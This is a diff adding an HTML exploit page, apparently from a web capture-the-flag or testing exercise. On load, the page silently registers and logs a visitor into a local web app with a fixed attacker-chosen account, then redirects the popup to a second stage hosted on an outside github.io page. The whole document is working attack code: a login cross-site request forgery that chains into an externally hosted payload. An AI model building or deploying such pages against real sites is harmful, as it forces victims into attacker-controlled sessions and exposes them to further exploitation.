@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body>
+<form id="regForm" method="POST" action="http://localhost:3000/register" target="popup">
+  <input name="username" value="twopage">
+  <input name="password" value="twopage">
+</form>
+
+<form id="loginForm" method="POST" action="http://localhost:3000/login" target="popup">
+  <input name="username" value="twopage">
+  <input name="password" value="twopage">
+</form>
+
+<script>
+var popup = window.open('about:blank', 'popup');
+
+document.getElementById('regForm').submit();
+
+setTimeout(function(){
+  document.getElementById('loginForm').submit();
+}, 200);
+
+// 로그인 후 우리 ex2.html로 이동
+setTimeout(function(){
+  popup.location.href = 'https://kiranshownny.github.io/webtest/ex2.html';
+}, 500);
+</script>
+</body>
+</html>
